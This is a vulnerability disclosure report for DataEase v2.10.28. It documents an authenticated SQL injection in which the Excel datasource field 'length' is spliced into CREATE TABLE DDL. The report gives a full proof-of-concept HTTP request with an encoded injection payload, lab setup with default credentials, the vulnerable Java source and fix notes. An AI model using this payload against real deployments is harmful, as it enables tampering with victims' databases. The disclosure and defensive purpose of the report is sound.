### Vulnerability details

**Official website / Product:** https://dataease.cn / https://github.com/dataease/dataease

**Repository:** dataease/dataease (stars at selection: 25000; reconfirmed 24665)

**Vulnerability type:** SQLi (CWE-89 — unsanitized `TableField.length` interpolated into engine-DB CREATE TABLE DDL)

**Vulnerability versions:** v2.10.28 @ `4b134d3575ff17f64ee539717e0660ee4efcc2d4` (official image `registry.cn-qingdao.aliyuncs.com/dataease/dataease:v2.10.28`); same sink also in `H2EngineProvider`

**Vulnerability URL / Parameter:** `POST /de2api/datasource/save`, JSON field `configuration` (Base64(JSON)) → Excel sheet `fields[].length` (when `deExtractType=0`, concatenated into `varchar(...)`). Same call path for API / ExcelRemote datasource save and sync via `createEngineTable`.

**Complex:** yes

### Verification procedure

1. Bring up the lab (original `labs/dataease-r44-a1/` was cleaned after verification; images were also removed. Recreate the same topology):
   - App image: `registry.cn-qingdao.aliyuncs.com/dataease/dataease:v2.10.28` (commit `4b134d3575ff17f64ee539717e0660ee4efcc2d4`), container **`dataease-r44a1`**, service `dataease`, host port **22401→8100**.
   - Engine/meta DB image: `registry.cn-qingdao.aliyuncs.com/dataease/mysql:8.4.11`, container **`mysql-de-r44a1`**, service `mysql-de` (schema `dataease`, port 3306 only on the compose network).
   - Credentials: default admin `admin` / `DataEase@123456`; MySQL per official installer default `root` / `Password123@mysql`.
   - Prefer the official installer tree (repo tag `v2.10.28` / `installer/dataease/`): in `install.conf` set `DE_PORT=22401`, `DE_MYSQL_HOST=mysql-de`, `DE_MYSQL_PASSWORD=Password123@mysql`, pin images to `v2.10.28` / `mysql:8.4.11`; change compose `container_name` values to `dataease-r44a1` / `mysql-de-r44a1` (to match the `docker exec` below). After `docker compose up -d`, confirm both containers healthy. Ready-state:

```
NAME             IMAGE                                                         STATUS                   PORTS
dataease-r44a1   registry.cn-qingdao.aliyuncs.com/dataease/dataease:v2.10.28   Up (healthy)             0.0.0.0:22401->8100/tcp
mysql-de-r44a1   registry.cn-qingdao.aliyuncs.com/dataease/mysql:8.4.11        Up (healthy)             3306/tcp, 33060/tcp
```

   - Official installer key variables (as verified; write into `install.conf` / `.env`):

```
DE_BASE=/opt
DE_PORT=22401
DE_MYSQL_HOST=mysql-de
DE_MYSQL_DB=dataease
DE_MYSQL_USER=root
DE_MYSQL_PASSWORD=Password123@mysql
```

2. Authenticate for a token (the PoC `X-DE-TOKEN` below is a lab-captured session — refresh before retesting):
   - `GET /de2api/dekey` for RSA material (frontend `encryption.ts`: AES-unwrap the 2048-bit X.509 SPKI Base64 public key, then JSEncrypt/RSA PKCS#1-encrypt the password).
   - `POST /de2api/login/localLogin` with username `admin` and the RSA ciphertext of `DataEase@123456`; take `X-DE-TOKEN` / `DE-TOKEN` from the response / `Set-Cookie`.
3. Build an Excel-type datasource: Base64(JSON) `configuration` with field `col1` and `length` = `10),injected_r44a1 int)#` (closes `varchar(`, injects an extra column definition, `#`-comments the trailing `);`). Decoded `configuration` is under “configuration plaintext” below.
4. `POST /de2api/datasource/save` with that JSON (authenticated admin / datasource write).
5. Confirm the injected column on the engine DB:

```bash
docker exec mysql-de-r44a1 mysql -uroot -pPassword123@mysql -N -e 'DESC dataease.excel_r44a1_finalpoc'
# expect:
# col1	varchar(10)	YES		NULL
# injected_r44a1	int	YES		NULL
```

HTTP may later return `文件名非法` from `extractExcelData` on the fake path `/tmp/x.xlsx`; `createEngineTable` already succeeded.

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /de2api/datasource/save HTTP/1.1
Host: 127.0.0.1:22401
User-Agent: r44-a1-poc/1.0
Accept: application/json
Content-Type: application/json
X-DE-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MSwiZXhwIjoxNzkzNjYwMDA0fQ.sfaX5wOTpqJvjFz771sVAvNpbHTCEVNYk5x5J3nTkK8
Content-Length: 732
Connection: close

{"pid":0,"name":"r44a1-final-poc","type":"Excel","configuration":"W3siZXhjZWxMYWJlbCI6ImZpbmFscG9jIiwidGFibGVOYW1lIjoiZmluYWxwb2MiLCJkZVRhYmxlTmFtZSI6ImV4Y2VsX3I0NGExX2ZpbmFscG9jIiwicGF0aCI6Ii90bXAveC54bHN4Iiwic2hlZXRJZCI6IjExMTExMTExLTExMTEtMTExMS0xMTExLTExMTExMTExMTExMSIsInNoZWV0RXhjZWxJZCI6IjIyMjIyMjIyLTIyMjItMjIyMi0yMjIyLTIyMjIyMjIyMjIyMiIsImZpbGVOYW1lIjoicjQ0YTEueGxzeCIsImZpZWxkcyI6W3sibmFtZSI6ImNvbDEiLCJ0eXBlIjoiVEVYVCIsImZpZWxkVHlwZSI6IlRFWFQiLCJkZVR5cGUiOjAsImRlRXh0cmFjdFR5cGUiOjAsImxlbmd0aCI6IjEwKSxpbmplY3RlZF9yNDRhMSBpbnQpIyIsImNoZWNrZWQiOnRydWUsInByaW1hcnlLZXkiOmZhbHNlLCJwcmVjaXNpb24iOjB9XSwianNvbkFycmF5IjpbWyJhIl1dLCJkYXRhIjpbWyJhIl1dLCJsYXN0VXBkYXRlVGltZSI6MTczMDAwMDAwMDAwMH1d","description":"length-ddl-sqli"}
```

`configuration` plaintext (Base64-decoded; equivalent to the request body; shows the injection point):

```json
[
  {
    "excelLabel": "finalpoc",
    "tableName": "finalpoc",
    "deTableName": "excel_r44a1_finalpoc",
    "path": "/tmp/x.xlsx",
    "sheetId": "11111111-1111-1111-1111-111111111111",
    "sheetExcelId": "22222222-2222-2222-2222-222222222222",
    "fileName": "r44a1.xlsx",
    "fields": [
      {
        "name": "col1",
        "type": "TEXT",
        "fieldType": "TEXT",
        "deType": 0,
        "deExtractType": 0,
        "length": "10),injected_r44a1 int)#",
        "checked": true,
        "primaryKey": false,
        "precision": 0
      }
    ],
    "jsonArray": [["a"]],
    "data": [["a"]],
    "lastUpdateTime": 1730000000000
  }
]
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 
X-DE-EXECUTE-VERSION: 2.10.28
Set-Cookie: DE-TOKEN=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MSwiZXhwIjoxNzkzNjYwMDA0fQ.sfaX5wOTpqJvjFz771sVAvNpbHTCEVNYk5x5J3nTkK8; Path=/; HttpOnly; SameSite=Lax
Cache-Control: no-cache
Cache: no-cache
Pragma: no-cache
Expires: 0
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: default-src * data: blob: 'unsafe-inline' 'unsafe-eval'; frame-ancestors 'self'
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Vary: origin,access-control-request-method,access-control-request-headers,accept-encoding
Content-Encoding: gzip
Content-Type: application/json
Transfer-Encoding: chunked
Date: Mon, 02 Nov 2026 06:55:40 GMT
Keep-Alive: timeout=70
Connection: keep-alive

{"code":40001,"msg":"DEException(code=40001, msg=文件名非法)","data":null}
```

Impact proof (engine MySQL `DESC`, Docker-verified):

```
Field             Type         Null  Key  Default  Extra
col1              varchar(10)  YES        NULL
injected_r44a1    int          YES        NULL
```

Injected column `injected_r44a1` of type `int` proves attacker-controlled `tableField.length` was interpolated into `CREATE TABLE` DDL and executed on the engine DB.

Effective DDL shape:

```sql
CREATE TABLE IF NOT EXISTS `excel_r44a1_finalpoc`(`col1` varchar(10),injected_r44a1 int)#);
```

Verification result notes:

- `createEngineTable` runs before `extractExcelData`; the fake Excel path `/tmp/x.xlsx` yields a later `文件名非法` response (HTTP 200 + `code=40001`), but DDL already committed.
- `DESC dataease.excel_r44a1_finalpoc` confirms attacker-controlled column `injected_r44a1 int` in the engine schema.
- Requires authenticated datasource-write privilege (default `admin`); not unauthenticated. Refresh the lab-snapshot `X-DE-TOKEN` before retesting.
- Same concatenation exists for `TINYINT(" + tableField.getPrecision() + ")` and in `H2EngineProvider`.

### Vulnerability analysis

When saving Excel/API/ExcelRemote datasources, DataEase builds a `CREATE TABLE` on the **engine database** from the request’s `TableField` list. GHSA-64vv-3552-hpcf (fixed in 2.10.27) only hardened **identifiers** (table/column names) via `EngineProvider.quoteIdent` / `validateIdentifier` and limited engine SQL to a single statement; it did **not** sanitize type-width fields such as `TableField.length` / `precision`.

In `MysqlEngineProvider.createTableSql`, for `deExtractType == 0`:

`varchar(" + tableField.getLength() + ")`

`length` is a `String`. An attacker can close the parenthesis and inject extra column definitions or other DDL fragments. This PoC uses `#` to comment out the template’s trailing `);`, so the statement still passes `validateSingleStatement` and executes on engine MySQL, planting the attacker column.

Call chain: `DatasourceServer.save` (Excel branch) → `DatasourceSyncManage.createEngineTable` → `MysqlEngineProvider.createTableSql` → `calciteProvider.exec`.

Trigger / sink source (full path and line numbers):

```java
# File: core/core-backend/src/main/java/io/dataease/datasource/provider/MysqlEngineProvider.java
# Lines: 113-155
private String createTableSql(final List<TableField> tableFields) {
    List<String> columnDefs = new ArrayList<>();
    List<String> primaryKeys = new ArrayList<>();
    for (TableField tableField : tableFields) {
        if (!tableField.isChecked()) {
            continue;
        }
        String quotedName = quoteIdent(tableField.getName(), '`');
        if (tableField.isPrimaryKey()) {
            primaryKeys.add(quotedName);
        }
        String type;
        switch (tableField.getDeExtractType()) {
            case 0:
                if (StringUtils.isNotEmpty(tableField.getLength())) {
                    type = "varchar(" + tableField.getLength() + ")";
                } else {
                    type = "longtext";
                }
                break;
            // ...
            case 4:
                type = "TINYINT(" + tableField.getPrecision() + ")";
                break;
            default:
                type = "longtext";
                break;
        }
        columnDefs.add(quotedName + " " + type);
    }
    // ...
    return "(" + String.join(",", columnDefs) + ")";
}
```

```java
# File: core/core-backend/src/main/java/io/dataease/datasource/server/DatasourceServer.java
# Lines: 286-303
if (dataSourceDTO.getType().equals(DatasourceConfiguration.DatasourceType.Excel.name())) {
    DatasourceRequest datasourceRequest = new DatasourceRequest();
    datasourceRequest.setDatasource(dataSourceDTO);
    List<DatasetTableDTO> tables = ExcelUtils.getTables(datasourceRequest);
    for (DatasetTableDTO table : tables) {
        datasourceRequest.setTable(table.getTableName());
        List<TableField> tableFields = ExcelUtils.getTableFields(datasourceRequest);
        try {
            datasourceSyncManage.createEngineTable(datasourceRequest.getTable(), tableFields);
        } catch (Exception e) {
            // ...
        }
    }
    datasourceSyncManage.extractExcelData(coreDatasource, "all_scope");
}
```

```java
# File: core/core-backend/src/main/java/io/dataease/datasource/manage/DatasourceSyncManage.java
# Lines: 328-335
public void createEngineTable(String tableName, List<TableField> tableFields) throws Exception {
    CoreDeEngine engine = engineManage.info();
    EngineRequest engineRequest = new EngineRequest();
    engineRequest.setEngine(engine);
    EngineProvider engineProvider = ProviderUtil.getEngineProvider(engine.getType());
    engineRequest.setQuery(engineProvider.createTableSql(tableName, tableFields, engine));
    calciteProvider.exec(engineRequest);
}
```

### Fix notes

1. Parse `TableField.length` / `precision` as strict positive integers (or an allow-list enum) before any DDL concatenation.
2. Build type clauses from validated numerics only; never concatenate raw strings into `CREATE TABLE`.
3. Regression-cover `MysqlEngineProvider` and `H2EngineProvider` `varchar` / `TINYINT` branches, plus Excel / API / ExcelRemote save and sync paths.
